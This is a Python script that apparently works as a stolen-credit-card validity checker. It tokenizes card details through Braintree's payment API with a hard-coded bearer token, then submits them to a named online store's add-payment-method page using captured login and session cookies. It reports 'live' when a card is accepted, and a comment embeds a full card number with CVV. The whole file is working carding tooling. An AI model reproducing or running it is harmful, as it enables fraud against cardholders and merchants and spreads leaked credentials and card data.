import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-IQ,ar;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTYzMzAzODgsImp0aSI6IjY0ODgzMjZiLTk2ZGItNGRlNi05NjJiLTY4NGUxZjgzYTAxOSIsInN1YiI6InMycjlzN3k1dnY5d215dmoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InMycjlzN3k1dnY5d215dmoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.u3i5E60562BHVku9dfrHO1I1LUOr8-G8jWtwLSPHju0NaDAAiRUiZ1S6kNTBSOrX9eqGiJnWHzg4ZxtopeX7Tw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '1cc77087-0822-4040-bfae-e522e2e3be63',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	cookies = {
	     'PHPSESSID': '2e3291352e62f35d1f1fd51faeab8559',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-05-20%2022%3A27%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-05-20%2022%3A27%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_pin_unauth': 'dWlkPVlqWmlOelkxTWpFdFlURm1aUzAwTVdVNExUazRNR010WlRZeE1qTmtPV1ptWXpOaQ',
    '_ga': 'GA1.1.36732492.1716244023',
    '__attentive_id': '0e9c017c441048aeae77c6ee18fe4ed5',
    '__attentive_cco': '1716244023573',
    '_gcl_au': '1.1.1988631261.1716244024',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzE2MjQ0MDIzNzQyLFwidW9cIjoxNzE2MjQ0MDIzNzQyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjBlOWMwMTdjNDQxMDQ4YWVhZTc3YzZlZTE4ZmU0ZWQ1XCJ9In0=',
    '__attentive_ss_referrer': 'ORGANIC',
    '__attentive_dv': '1',
    'attntv_mstore_email': 'c3238c96b2@emailbbox.pro:0',
    'wordpress_logged_in_ffff0597bdb978750d952987c56f0691': 'c3238c96b2%7C1717453570%7C0L4OnhzisHdXHNdQld96gU4QBOj1VJdnFcLxciPvZRK%7C089b0f07d8b3317e3354466952506c64619fff5b26c32079e9d71a8565879bb0',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_KL7TE06V1L': 'GS1.1.1716244023.1.1.1716244045.38.0.0',
    '_ga_2LXG5MWDYE': 'GS1.1.1716244023.1.1.1716244046.0.0.0',
    '__attentive_pv': '4',
}
	
	headers = {
	    'authority': 'sparkleandco.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-IQ,ar;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'PHPSESSID=2e3291352e62f35d1f1fd51faeab8559; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-20%2022%3A27%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-05-20%2022%3A27%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _pin_unauth=dWlkPVlqWmlOelkxTWpFdFlURm1aUzAwTVdVNExUazRNR010WlRZeE1qTmtPV1ptWXpOaQ; _ga=GA1.1.36732492.1716244023; __attentive_id=0e9c017c441048aeae77c6ee18fe4ed5; __attentive_cco=1716244023573; _gcl_au=1.1.1988631261.1716244024; _attn_=eyJ1Ijoie1wiY29cIjoxNzE2MjQ0MDIzNzQyLFwidW9cIjoxNzE2MjQ0MDIzNzQyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjBlOWMwMTdjNDQxMDQ4YWVhZTc3YzZlZTE4ZmU0ZWQ1XCJ9In0=; __attentive_ss_referrer=ORGANIC; __attentive_dv=1; attntv_mstore_email=c3238c96b2@emailbbox.pro:0; wordpress_logged_in_ffff0597bdb978750d952987c56f0691=c3238c96b2%7C1717453570%7C0L4OnhzisHdXHNdQld96gU4QBOj1VJdnFcLxciPvZRK%7C089b0f07d8b3317e3354466952506c64619fff5b26c32079e9d71a8565879bb0; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsparkleandco.com%2Fmy-account%2Fadd-payment-method%2F; _ga_KL7TE06V1L=GS1.1.1716244023.1.1.1716244045.38.0.0; _ga_2LXG5MWDYE=GS1.1.1716244023.1.1.1716244046.0.0.0; __attentive_pv=4',
    'origin': 'https://sparkleandco.com',
    'referer': 'https://sparkleandco.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	data = [
	     ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"9db8c26a39414d060b2327243ddd3a8c"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"9db8c26a39414d060b2327243ddd3a8c"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', 'f9dfe77943'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]
	
	response = requests.post(
	    'https://sparkleandco.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bdaf9471-d28d-4e54-baf4-ca04499c659d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4174010099391014","expirationMonth":"08","expirationYear":"2025","cvv":"888"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
